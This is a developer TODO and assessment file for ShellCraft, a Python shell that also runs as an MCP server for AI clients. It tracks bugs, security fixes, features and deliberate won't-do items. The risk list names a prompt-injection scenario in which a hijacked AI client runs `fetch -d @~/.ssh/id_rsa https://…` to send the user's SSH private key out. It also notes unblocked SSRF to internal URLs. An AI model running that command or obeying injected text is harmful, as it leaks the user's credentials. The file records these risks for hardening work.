# ShellCraft — TODO

> Fifth full assessment: 2026-10-12 ([UPGRADE-ASSESSMENT-5.md](UPGRADE-ASSESSMENT-5.md)): the GitHub CI has never been green, the Windows pass, the two copies drifting, and the subshell / jobs / panes question.
> First assessment: v0.1.0 (`main` @ 72a9897), when there were 42 tests. Second full assessment: 2026-09-28 (`main` @ 93e719b). Third full assessment: 2026-09-30 (`main` @ 3a74273). Fourth full assessment: 2026-10-11 (`main` @ e9fe02f, [UPGRADE-ASSESSMENT.md](UPGRADE-ASSESSMENT.md)), worked through on 2026-10-12 as release 0.2.0 ([CHANGELOG.md](CHANGELOG.md)). Checked items have been done since then.
> **Current state (0.2.0):** 58 builtins shown by `help` (62 registered, with `[` / `[[` hidden and the `for` / `if` keyword entries) and the `while` / `until` / `case` keywords, shell variables, `$(( ))`, `$( )` and globs on plain lines, `<` / `2>` / `2>&1` / `&>`, `;` / `&&` / `||`, `$?`, `!!` / `!$` / `!N` / `!prefix`, `modules enable/disable`, a settings system (OS commands off by default) with API keys for modules (`ENV_SETTINGS`), modules `fetch`, `filter`, `myip`, `ip2geo`, `queryDns`, `queryCert` and `queryCensys`, the module authoring kit (`templates/` and the `tools/ingest` script → module wizard with its checker), switch, positional and quote-aware completion, syntax highlighting and a toolbar, a configurable prompt (git branch, duration, clock), typed MCP parameters, man-page resources, per-call limits, a bearer token on the HTTP transport, `expose = false`, hot reload and lazy module loading. 715 tests pass on Python 3.14 (2026-10-12) (with the `censys` extra); CI runs them on Linux and Windows for 3.11–3.14. About 14,000 lines of application code (core, modules, tools) and 5,300 lines of tests. An offline `Install/` bundle (Windows installer, Ubuntu 26.04 `.deb`s, wheels for Windows/Linux × CPython 3.11–3.14, `setup.ps1` / `setup.sh`) makes air-gapped installs possible.

## Assessment

**What's solid**
- The layering is clean. The parser, the pipeline executor and the UI are separate. `run_line()` is UI-agnostic and shared by the REPL, the MCP server and the tests.
- The three-file module contract (`.py` / `.md` / `.skill`) is simple and works well. A broken module becomes a warning, not a crash.
- The MCP integration is safe by default: the pipeline tool can't redirect to files, can't use shell-state builtins, and can't run system commands.
- The UX feels good: themes, ghost text, delayed spinner, auto-pager and error panels that point at the failing segment.

**Biggest risks**
1. **Security of the MCP surface.** `fetch` can request *any* URL, including loopback and private addresses. *(Accepted, like reading any file the user can read: see Won't do.)*
2. **Shell-grammar gaps fail silently.** `2>` is misparsed, and `<`, `;` and `&&` become plain arguments. Users expecting POSIX behavior can get wrong results with no error. *(Fixed: they're now rejected with a parse error.)*
3. **The system-command fallback is capture-only.** Interactive programs misbehave, and "no match" exit codes abort the pipeline. *(Now off by default, and the ported builtins cover the common commands. Accepted: see Won't do.)*
4. **Only tested on Linux.** None of the Windows paths have been run yet.
5. **Packaging is broken.** A non-editable install crashes on startup (see Bugs). Nothing caught it because there's no CI and the tests run from the source tree. *(Fixed; the packaging smoke test in CI is still open.)*
6. **The MCP surface can exfiltrate.** Reading any file is accepted, and so is `fetch` reaching any URL, but together they let a prompt-injected client run `fetch -d @~/.ssh/id_rsa https://…`. The per-module exposure switch (Security) is the fix that fits the "modules stay as they are" decision.

**Second assessment (2026-09-28)**
- The architecture held up well: 7 modules and 37 builtins were added without changing the pipeline design, and the three-file contract now drives MCP schemas, man-page resources and Tab completion.
- The docs are thorough and mostly in sync. The test suite is fast and broad, but it only exercises the source tree, so packaging and platform bugs slip through.
- The main gaps are distribution (packaging, CI, license), hardening the MCP boundary (timeouts, exposure, argument handling), and exit-status semantics.

**Third assessment (2026-09-30)**
- The design is still sound, and lint is clean where it matters: ruff finds no pyflakes errors (only 35 style hints), and mypy's 41 errors are annotation-level (missing `None` narrowing, `list` vs generator), none a real bug.
- The main new risks are another operator that slips through the parser (`&`, the same class as the fixed `;` bug), `config.json` handling (a malformed value crashes every mode, and two open shells overwrite each other's changes), and the MCP HTTP transport having no authentication, which matters on shared lab machines.
- Offline installs were verified in a network-less Ubuntu 26.04 container. `setup.ps1` has only been syntax-checked, not run on Windows.

**Fourth assessment (2026-10-11)**
- The project was in good shape; the architecture absorbed loops, aliases, history expansion, 46 builtins and the MCP server without bending. Two new ways to crash the REPL (a redirect to `~nosuchuser`, a deleted working directory) and `main.py` clearing the screen in `--mcp` mode were the urgent items; the older P0s (`&`, `cp -r` into itself, a malformed `config.json`) still reproduced.
- Everything the assessment listed was done on 2026-10-12 (0.2.0): see [CHANGELOG.md](CHANGELOG.md). The open items below are what remains afterwards: the `shellcraft/` package rename, `~/.shellcraft/modules`, the OS keyring, a real Windows pass, mypy's annotation debt, and true streaming between pipeline segments.

Items marked **(verified)** were reproduced during the assessment.

---

## 🐞 Bugs — P0

- [x] **Invalid custom theme color crashes startup**: `all_themes()` now checks each color against both Rich and prompt_toolkit, keeps the base preset's color, and the CLI prints a warning on stderr. — `core/themes.py`
- [x] **Unsupported operators were passed on as arguments**: `rm a ; ls` also deleted a file named `ls`, and `a 2> err.txt` sent stdout to `err.txt`. `;`, `&&`, `||`, `<`, `2>`, `2>>`, `2>&1`, `&>` and `>&` now raise a `ParseError` until they are implemented (see Features). — `core/parser.py`
- [x] **A non-editable `pip install .` crashed on startup**: `packages = ["core"]` left out `core.commands`, and the wheel had no modules. The wheel now ships `core.commands` and the bundled modules (as `core/bundled_modules`, with their `.md` and `.skill` files). An installed copy loads those modules, and a source checkout or editable install still uses `./modules`. Verified by installing the wheel into a clean venv. — `pyproject.toml`, `core/cli.py`
- [ ] **Packaging leftovers**: load a user directory `~/.shellcraft/modules` next to the bundled ones, so an installed copy can add modules without `--modules`. `tools/` and `templates/` still work from a source checkout only. The generic top-level name `core` can collide with other packages in site-packages, so move it under a `shellcraft/` package. — `core/cli.py`, `core/loader.py`, `pyproject.toml`
- [x] **MCP values that start with `-` became switches**: `filter` with `{"pattern": "-v"}` failed, and text from untrusted content could inject switches. `params.to_argv` now passes such a value as `--flag=VALUE` and puts `--` before the positionals. — `core/params.py`
- [x] **Windows 11 console I/O**: the interactive shell used whatever `sys.stdin`/`sys.stdout` were and trusted `isatty()` (True for `NUL`), and prompt_toolkit could read keys from `CONIN$` while putting a different handle into raw mode. It now opens `CONIN$`/`CONOUT$` itself with VT processing on (`WindowsConsole`), and stdout/stderr are UTF-8 for pipes and files. `Shell` owns that session (a context manager): it enters the prompt_toolkit app session before the `PromptSession` is built, moves Rich to a truecolor VT console on `CONOUT$`, and on exit, a crash or a failed setup restores the Rich console, the app session and the console mode in reverse order. *(2026-10-06: rewritten to drive the devices directly, with `Win32Input` bound to the `CONIN$` handle and a plain `Vt100_Output` on `CONOUT$`; the process's std handles are no longer redirected.)* *(2026-10-09: still broken in Windows Terminal (garbled prompt, Backspace and Tab seemed dead). Moved to `core/console.py` (`create_prompt_toolkit_console`, `build_console`); the output now copies prompt_toolkit's own `Windows10_Output` (each flush in exactly `PROCESSED | VT`, size without the last column) instead of delayed wrap (`DISABLE_NEWLINE_AUTO_RETURN`) at full width, both console modes are restored, and `SHELLCRAFT_CONSOLE=direct|legacy-keys|native` plus `tools/winconsole_probe.py` check it on the real machine.)* *(Needs a pass on a real Windows 11 machine: see the Windows verification item.)* — `core/console.py`, `core/shell.py`, `core/cli.py`, `core/stdio.py`
- [x] **Windows: redirected output crashed on box drawing**: error panels on `2>` and redirected tool output raised `UnicodeEncodeError` under cp1252. — `core/stdio.py`, `tools/`
- [x] **Windows: `dir`/`type` output was decoded as UTF-8** although `cmd.exe` writes the OEM code page; internal commands now run with `cmd /u` and are read as UTF-16. — `core/pipeline.py`
- [x] **`&` is still passed on as an argument**: an unquoted `&` at the start of a word is rejected with a `ParseError` (background jobs); `&>` is a redirection and `a=1&b=2` stays one word. *(2026-10-12)* — `core/parser.py`
- [x] **A malformed `config.json` crashes startup in every mode, MCP included**: `load_config()` checks each known section's type and drops a bad one with a warning on stderr. *(2026-10-12)* — `core/config.py`
- [x] **`cp -r DIR DIR/sub` recurses into itself**: refused ("cannot copy a directory into itself"). *(2026-10-12)* — `core/commands/files.py`
- [x] **`main.py` cleared the screen before argument parsing, in every mode** (added 2026-10-10): the interactive shell clears the screen (`clear_on_start`), `--mcp` and `--version` never do. *(2026-10-12)* — `main.py`, `core/cli.py`
- [x] **A redirect to `~nosuchuser` and a deleted working directory killed the shell**: both are clean errors, and `Shell.loop()` catches any exception as a last resort. *(2026-10-12)* — `core/pipeline.py`, `core/shell.py`
- [x] **Pager search `n` got stuck on the last screen**: the last match is now tracked apart from the scroll position, so `n`/`N` step through every match, and matches are highlighted in reverse video. — `core/output.py::page`

## 🔒 Security — P0

- [x] **Per-module MCP exposure switch**: `expose = false` in `.skill` and `--expose name,...` keep modules local-only, in the tool list, the man-page resources and `shellcraft_pipeline` alike (`ctx.module_filter`). *(2026-10-12)* — `core/loader.py`, `core/mcp_server.py`
- [x] **No timeout on MCP tool calls**: every call runs under `anyio.fail_after` (`SHELLCRAFT_MCP_TIMEOUT`, default 120 s, abandoned with an error), with caps on stdin (10 MB) and output (2 MB). *(2026-10-12)* — `core/mcp_server.py`
- [x] **History records everything**: a line typed with a leading space is no longer saved (bash's `ignorespace`). *(Values in `settings NAME VALUE` are still redacted.)* — `core/shell.py`
- [x] **History redaction can be bypassed**: `redact_line()` now checks every statement of the line, sees through a leading `\` and through aliases of `settings`. *(2026-10-12)* — `core/settings.py`, `core/shell.py`
- [x] **The MCP HTTP transport has no authentication**: `--mcp-http` requires `Authorization: Bearer <token>` (`--token`, `$SHELLCRAFT_MCP_TOKEN`, or a generated one printed at startup; `--no-token` opts out); `mcp start` generates one per server. *(2026-10-12)* — `core/mcp_server.py`, `core/mcp_child.py`
- [ ] **API keys are stored in plain text** in `config.json` (mode 600, which doesn't protect them on Windows). Offer the OS keyring (`keyring` package) as an optional backend. — `core/settings.py`

## 🔧 Bugs / polish — P1

- [x] **Hot reload races with MCP calls**: `ModuleRegistry.load()` emptied `self.modules` and then refilled it, while tool calls run in worker threads. A call that arrives mid-reload gets "Unknown tool" or "command not found". *(Fixed 2026-10-06: the new dicts are built aside and swapped in at the end.)* — `core/loader.py`
- [x] **Two open shells overwrite each other's config**: `save_config()` merges only the keys the session changed over the file's current content (entry by entry inside settings / env / aliases / themes / prompt) and writes through a temp file plus `os.replace`. *(2026-10-12)* — `core/config.py`
- [x] **`grep -m 0` prints one line**: fixed. *(2026-10-12)* — `core/commands/text.py`
- [x] **A quoted `~` in a redirect target is still expanded**: fixed; `~user` forms expand in the tokenizer, an unknown user stays as typed. *(2026-10-12)* — `core/pipeline.py`, `core/parser.py`
- [x] **One-shot `-c` mode removed** (2026-10-02): ShellCraft is used as the interactive shell (`python main.py`) or an MCP server, never as `shellcraft -c "…"`. Its open bugs went with it (a `BrokenPipeError` traceback when piped into `head`, no exit 130 on Ctrl-C, not passing on a system command's exit code), and so did its Windows-console-for-the-pager special case. — `core/cli.py`
- [x] **A redirect silently creates missing directories**: fixed. *(2026-10-12)* — `core/pipeline.py`
- [ ] **Ctrl-C abandons the module worker thread**, which keeps running (the spinner now says `Ctrl-C cancels` after 10 s, and MCP calls are abandoned after a timeout). Add a cooperative cancel flag in `modkit` that modules can check, or at least document the behavior. — `core/output.py::make_spinner_runner`
- [x] **`to_text()` flattens at a fixed width of 100**: it follows the shell's console width (`context.set_width_source`). *(2026-10-12)* — `core/context.py`
- [x] **`show()` renders twice**: the captured ANSI is written as is, and plain text over 5,000 lines goes straight to the pager. *(2026-10-12)* — `core/output.py`
- [x] **Rich and the prompt disagreed on the terminal size**: on Windows Rich used the full window width while the prompt left out the last column (so full-width lines took two rows), and Rich read the size through the std handles instead of `CONOUT$`. On both platforms an exported `COLUMNS`/`LINES` froze Rich's size, even when passed to `Console.__init__`. `TerminalConsole` now asks the current app session's output, so both agree and follow resizes. On Windows that's the visible window (`srWindow`, capped at the buffer width) without its last column, as prompt_toolkit's `Win32Output` reports it. *(2026-10-09: delayed wrap at full width was dropped; see the Windows 11 console item.)* — `core/console.py`
- [x] **Linux: the prompt and the pager ran in 256 colors** while Rich used truecolor, because prompt_toolkit reads only `TERM`, so the theme's colors were rounded off in the prompt. The shell now uses a truecolor output when `COLORTERM` is `truecolor`/`24bit` and stdout is a terminal; `NO_COLOR` and `PROMPT_TOOLKIT_COLOR_DEPTH` still win. — `core/shell.py`
- [x] **Windows: the prompt's `~` shortening was case-sensitive**: it now compares with `os.path.normcase`. — `core/shell.py`
- [x] **`cd` inside a pipeline changed the real cwd** (`cd x | pwd`): `cd` is now refused unless it's alone on the line (no pipe, no redirect). — `core/pipeline.py`
- [ ] **Loader hygiene**: there is no parent package, so relative imports inside modules fail. *(Stale `sys.modules["shellcraft_modules.*"]` entries are now cleared on every reload.)* — `core/loader.py`
- [x] **Switch completion**: Tab completes each command's options and option values from its `.skill` `[[args]]` (including the new `values` key) and its `.md` options table. It is modular, with no per-module code.
- [x] **Completer ignores quotes**: `split_word()` tracks quotes; a completed name with spaces is quoted. *(2026-10-12)* — `core/completer.py`
- [x] **Positional values aren't completed**: `options.positional_values()` reads them from the `.skill`. *(2026-10-12)* — `core/options.py`, `core/completer.py`
- [x] **Dead code**: `ShellContext.interactive` is now read by `settings NAME` to choose the hidden prompt.
- [x] **Version is defined twice**: `pyproject.toml` reads `core.__version__` (0.2.0). *(2026-10-12)* — `pyproject.toml`
- [x] **`sort -u -k N` dedupes whole lines**: fixed; `-s` keeps equal keys in input order. *(2026-10-12)* — `core/commands/text.py`
- [x] **DEVELOPMENT.md drift**: the permission table and the layout tree are current. *(2026-10-12)* — `DEVELOPMENT.md`
- [ ] **mypy's annotation debt**: 136 errors, none a real bug (missing `None` narrowing, generators passed as lists, Windows-only attributes). CI runs mypy as informational; make it gate once `core/` is clean. — `pyproject.toml`
- [ ] **True streaming between pipeline segments**: a module's `run()` may return an iterator of lines (drained before the next segment runs), but segments still don't run concurrently, so `yes | head` and `tail -f | grep` aren't possible (`tail -f` prints directly instead). — `core/pipeline.py`

## ⬆️ Upgrades — P1

- [x] **API-key precedence**: at startup a variable already in the environment (the user's shell, an MCP client's `env` block) now wins over the stored key, and `settings` shows `from environment (stored ••••ab12 unused)`. `settings NAME VALUE` during a session still replaces it. — `core/settings.py`
- [x] **Streaming pipelines**, first step: `run()` may return an iterator of lines (`pipeline._collect()`); plain `str` returns keep working. Concurrent segments are the open item above. *(2026-10-12)* — `core/pipeline.py`
- [x] **MCP improvements:**
  - [x] Every module's `.md` and every MCP-usable builtin's manual is a resource at `shellcraft://man/<name>`.
  - [x] Streamable-HTTP transport: `--mcp-http 127.0.0.1:38765` (loopback addresses only, DNS-rebinding protection on).
  - [x] `tools/list_changed` and `resources/list_changed` on reload, both to `subscriptions/listen` streams and to older clients' connections.
  - [x] `.skill` `[[params]]` declare typed, named parameters (the MCP input schema); all bundled modules and the template use them. Modules without them keep the raw `args` array. — `core/params.py`
- [x] **Hot reload**: the modules folder is polled for `.py`/`.md`/`.skill` changes, in the shell (before each command) and the MCP server (every second). The `hot_reload` setting turns it off. — `core/watch.py`
- [x] **`fetch`**: `--max-size` (default 10M), `-H/--header`, `-X/--method`, `-d/--data` (text, `@FILE`, `@-`), `--retry N` with backoff and `Retry-After`, and rejection of binary content.
- [x] **Themes**:
  - [x] Dracula, Gruvbox, Catppuccin and Tokyo Night presets
  - [x] `theme preview NAME` (no save), `theme reset`
  - [x] light-terminal variants (`solarized-light`, `catppuccin-latte`), menus and toolbars in theme colors
  - [x] theme validation warnings shown in the banner
- [x] **Exit status**: `$?` (0, 1, 2 for syntax errors, 127 not found / disabled, 130 Ctrl-C, an OS program's own code), the prompt shows `[✗ N]`, and `grep` returns 1 when nothing matches (plus `grep -q`). Commands return `WithStatus(value, n)` for a nonzero status that isn't an error. — `core/pipeline.py`, `core/context.py`, `core/commands/text.py`
- [x] **Loops and conditions**, two syntaxes: bash (`for …; do …; done`, `if …; then …; elif …; else …; fi`, with bash word splitting, `$( … )`, brace expansion and globs inside blocks, plus `test` / `[` / `[[` / `true` / `false`) and `-py` (`for -py NAME in … { … }`, `if -py (python) { … }`: no splitting, AST-vetted Python conditions walked without `eval`). `break` / `continue`; `;`, `&&`, `||`, `!` everywhere; continuation lines while a block is open. Statements keep the context's permission flags, so MCP gets loops with the same restrictions. — `core/script.py`, `core/commands/cond.py`
- [x] **History expansion**: `!!` and `!$`, printed before running and saved expanded. — `core/histexpand.py`, `core/shell.py`
- [x] **`modules -a` / `modules enable|disable NAME…`**: disabled modules are never imported, saved in `config.json` (`disabled_modules`), and skipped by `--mcp` / `--mcp-http` too. — `core/loader.py`, `core/builtins.py`
- [x] **`banner [-c]`** shows the startup banner again. — `core/builtins.py`
- [x] **Scripts, next steps** *(2026-10-12)*: piping or redirecting a whole loop (`done | sort`, `} > out`), `while` / `until`, `case`, assigning variables (`x=1`) and `$((…))`, `$( … )` and globbing on plain command lines, `!N` / `!prefix` / `!*`. Still open: `&&` / `||` inside `[[ ]]`, `select`, functions, `local`.

## ✨ Features — P2

- [x] **Shell grammar** *(2026-10-12)*:
  - [x] `<` input redirect
  - [x] `2>` / `2>>` / `2>&1` / `&>`
  - [x] `$VAR` expansion (shell variables, `export`, the environment in the interactive shell)
  - [x] glob expansion (`*.log`) for every command
  - [x] `~user`
  - [ ] `%VAR%`, `>&2`, background jobs (`&`)
- [x] **Ported builtins, first batch**: `ls`, `cat`, `grep`, `echo`, `tee`, `head`, `tail`, `wc`, `sort`, `uniq`, `date`, `mkdir`, `cp`, `mv`, `rm`, plus the `settings` command with OS commands off by default.
- [x] **Ported builtins, second batch**: `find`, `touch`, `which`, `tree`, `cut`, `tr`, `env` (`env` is blocked in MCP as sensitive).
- [x] **`alias` / `unalias`**: saved in `config.json`, expanded per pipeline step, `\NAME` skips an alias, not applied over MCP. — `core/aliases.py`
- [x] **`history`, `diff`, `du`**: `history [N] | -c`; `diff` with classic and unified (`-u`/`-U N`) output, `-i -w -b -q -s -r`, directories and binary files, output identical to GNU diff; `du` with apparent sizes (`-s -h -a -d N -c -S -b`), matching GNU `du --apparent-size`.
- [x] **More builtins** *(2026-10-12)*: `sleep`, `time`, `type`, `basename` / `dirname`, `realpath`, `stat`, `printf`, `seq`, `xargs`, `whoami`, `hostname`, `uname`, `export`, `unset`. Still open: `source`.
- [ ] **Startup rc file** `~/.shellcraft/rc` (aliases, env, theme). *(Aliases: done, `~/.shellcraft/aliases`.)*
- [ ] **Startup scripts, after the skeleton** *(2026-10-13: `core/startup.py`; scripts run in order, hand variables back through `$SHELLCRAFT_ENV_FILE`, failures and timeouts are reported)*. Open questions:
  - **Background scripts**: something that should keep running (a watcher, a tunnel) would block the prompt today. Run marked scripts as `sub` jobs, so they show in the subshell panel? A marker in the file (`# shellcraft: background`) or a separate folder?
  - **MCP mode**: run them for `--mcp` / `mcp start` too, so AI clients see the same variables? (Quietly, with no output on the MCP stream.)
  - **Order and dependencies**: name order only, or a `requires = …` line?
  - **ShellCraft commands at startup**: an `rc` file of ShellCraft lines (`theme nord`, `cd ~/work`, `sub htop`) next to the Python scripts?
  - **Per-script timeout** and a way to pass arguments; whether a failing script should be able to stop the shell (`exit 2` = abort?).
  - **Windows**: the same, untested there.
- [x] **Input-line syntax highlighting** with a prompt_toolkit lexer (`core/highlight.py`), a bottom toolbar with the usage of the command being typed, a configurable prompt with the git branch and the last command's duration (`prompt`), a transient prompt, and a styled Ctrl-R. *(2026-10-12)*
- [x] **Module authoring kit**: `templates/` (a reference module plus a guide) and `tools/ingest` (2026-10-06, replaces `modtest`/`mkprompt`): a standalone wizard that converts an existing script with minimal changes (`@script` in `core/modkit.py` captures its prints and exits), stops on conflicts, offers auto / manual / AI (Claude or OpenAI) application, drafts the `.md`/`.skill`, and checks the result (`tools/ingest check`).
- [ ] **Module scaffolding**: a `new-module NAME` builtin that copies the template trio and renames it, and running `tools/ingest check --all --strict` in CI.
- [ ] **Modules as packages**: `modules/<name>/` directories, per-module requirements, and version/author metadata in `.skill`.
- [ ] **Structured data mode**: JSON-lines between modules, with `select`, `where`, `sort-by` and a `table` renderer, for Nushell-style pipelines.
- [x] **Subshells / background jobs** *(2026-10-12, [UPGRADE-ASSESSMENT-5.md](UPGRADE-ASSESSMENT-5.md) 4.1–4.2)*: `sub` (a program on a pty with attach / detach, a nested ShellCraft, or a command in a worker thread), `jobs`, the footer on the last row with clickable tabs and Ctrl-] N. Still open: `cmd &` as a spelling of `sub cmd`, attach on Windows (needs `pywinpty`), a follow mode for a running command's output, a VT100 emulator (`pyte`) so switching back to a full-screen program restores its exact screen instead of replaying its last output. — `core/jobs.py`
- [ ] **`ask "..."` builtin**: a Claude-powered assistant that uses the loaded modules as tools and their `.skill` files as guidance.
- [x] **Network lookup modules**: `ip2geo` (ip-api.com), `queryDns` (DnsDumpster), `queryCert` (crt.sh) and `queryCensys` (Censys Platform SDK), plus API-key settings (`ENV_SETTINGS`: masked in `settings`, hidden prompt, exported in every mode including MCP).
- [ ] **More modules**: `json` (pretty-print/query), `hash`, `whois`, `weather`.
- [x] **Console diagnostics report**: the `diagnostics` setting (or `--diag`) prints a plain-text report at startup, before the banner, to paste into a bug report. It lists every size source side by side (the OS per fd, `shutil`, prompt_toolkit, the shell's Rich console, Rich's own detection), color detection on both sides, std stream encodings and the terminal environment variables, and on Windows the `CONOUT$` buffer vs. visible window, console modes before and after (flags spelled out), code pages and where the std handles point. Each probe is guarded, so a failing check is a line, not a crash. — `core/diagnostics.py`
- [x] **MCP HTTP server from inside the shell** (2026-10-02): `mcp start [HOST:PORT] [--allow-system]`, `mcp stop`, `mcp restart`, `mcp` (status) and `mcp log [N]` run `--mcp-http` as a child process in its own process group, logging to `~/.shellcraft/mcp-http.log`; it stops when the shell exits. — `core/mcp_child.py`, `core/builtins.py`
- [x] **`mcp start` leftovers**: the child watches its parent (`--parent-pid`, `watch_parent()`) and exits when the shell is gone, `kill -9` included; `mcp log` is appended across restarts. *(2026-10-12)* Still open: an autostart setting. — `core/mcp_child.py`
- [ ] **A `diag` builtin**: the same report on demand, to check the size again after resizing the window. — `core/builtins.py`

## 🧪 Tests / CI / docs — P1

- [x] **Missing tests** *(2026-10-12, `tests/test_tui.py`, `test_robustness.py`, `test_scripting_more.py`, `test_commands_more.py`, `test_mcp_boundary.py`)*: the completer, pager key handling (pipe input), the `show()` threshold, theme persistence and preview, custom theme parsing, the banner's narrow fallback. The packaging smoke test runs in CI (build the wheel, install it into a clean venv, run `shellcraft --version`).
- [x] **`.gitlab-ci.yml`** (and `.github/workflows/ci.yml` for the mirror): lint, the module checker, pytest on Linux and Windows for Python 3.11–3.14, and the packaging smoke test. The Windows job on GitLab needs a runner tagged `windows` (`WINDOWS_RUNNER=true`). *(2026-10-12)*
- [x] **Tooling**: ruff and mypy configured in `pyproject.toml` and installed by the `dev` extra; ruff is clean and gates CI, mypy is informational (see the annotation-debt item). A pre-commit hook is still open. *(2026-10-12)*
- [ ] **Offline bundle upkeep**: `Install/` adds ~112 MB of binaries to the git history, and every refresh adds more. Consider publishing it as a release asset or tracking it with Git LFS. Run `setup.ps1` on a real Windows machine (so far it's only been syntax-checked), and document how to refresh the wheels.
- [x] **Docs split**: README (install and usage), `templates/README.md` (module authoring), `DEVELOPMENT.md` (layout, architecture, tests).
- [x] **Docs**: a CHANGELOG (2026-10-12), the demo recording and the LICENSE.
- [ ] **Windows verification pass**: start with `python tools\winconsole_probe.py` in Windows Terminal (and with `SHELLCRAFT_CONSOLE=legacy-keys` / `native`), then `python main.py --diag`. Covering prompt rendering (Windows Terminal and classic conhost, where `⚡` may render one cell wide), the pager, `cmd` builtins, paths and the MCP stdio server. Also `python main.py < NUL` and `python main.py > NUL`, the cases the console fixes target. For the window size: run `python main.py --diag` and keep the report, check that full-width panels leave no blank row after them (delayed wrap) and that `help` re-wraps after a resize, in both Windows Terminal and classic conhost.

## 🚫 Won't do

The OS-program fallback (`system_commands` / `--allow-system`) stays opt-in and capture-only. The portable builtins and modules are the supported path.

- **Nonzero exit from a system command aborts the pipeline** (for example grep's "no match" status 1). — `core/pipeline.py::_run_system`
- **Interactive system programs misbehave** (`vim`, `top`, `ssh`, `python`) because their stdin and stdout are pipes. — `core/pipeline.py`
- **A system command's stderr is dropped on success.** — `core/pipeline.py`
- **Captured system output loses its colors** (no `FORCE_COLOR` / `CLICOLOR_FORCE`). — `core/pipeline.py`

MCP file access is deliberately not sandboxed: the AI can read every file the user running the server can read.

- **`--root DIR` sandbox for MCP file reads** (`fetch` and the read builtins `cat`, `grep`, `ls`, `find`, `tree`…). File-*changing* commands and redirects stay blocked in MCP. — `core/mcp_server.py`

The bundled modules (`fetch`, `filter`, `ip2geo`, `myip`, `queryCensys`, `queryCert`, `queryDns`) stay as they are: no further fixes or improvements are planned for them.

- **`fetch`: SSRF blocking over MCP.** Loopback, private, link-local and cloud-metadata URLs stay reachable, with no URL allowlist. *(Its max response size was done: `--max-size`.)* — `modules/fetch.py`
- **`queryDns` / `queryCensys` spend the user's API quota through MCP**, with no per-module opt-out in their `.skill` notes. — `modules/queryDns.skill`, `modules/queryCensys.skill`
- **`queryCensys`**: checking the table layouts against a real token (only the error paths were live-tested), `--at-time` for host history, and `web HOSTNAME:PORT` lookups (`get_web_property`). — `modules/queryCensys.py`
- **`queryDns`**: confirming the CNAME record shape with a domain that has CNAMEs, and the Plus-only `?map=1` domain map. — `modules/queryDns.py`
- **`queryCert`**: a per-test `timeout` key in `[[tests]]`, because crt.sh often needs more than the checker's 10 s. — `tools/ingest/check.py`
- **`ip2geo`**: the ip-api.com batch endpoint (`POST /batch`, up to 100 IPs per request) for long lists. — `modules/ip2geo.py`
- **`myip`**: a short-lived result cache, parallel lookups for many IPs, comma-separated `--field` lists, and a clear message for private-range IPs. — `modules/myip.py`

The ShellCraft name stays fixed: integrators can't rebrand the shell.

- **Custom brand / prompt name**: a `brand` block (`name`, `prompt`, `icon`, `tagline`) in `config.json` or a brand file, used by every on-screen string: the prompt, the `help` title, the banner, `--version`, `which`, the goodbye line and the MCP server title. It would need a single `core/brand.py`, a full A–Z/0–9 banner font with a one-line fallback, and validation of the value (no control characters, a length cap). Internal identifiers (`~/.shellcraft`, `SHELLCRAFT_*`, `shellcraft_pipeline`, `shellcraft://man/`) would stay unchanged. — `core/shell.py`, `core/banner.py`, `core/builtins.py`, `core/cli.py`

---

**Legend:** **P0** = fix soon (correctness / security) · **P1** = next iteration · **P2** = nice to have · **Won't do** = out of scope, recorded on purpose
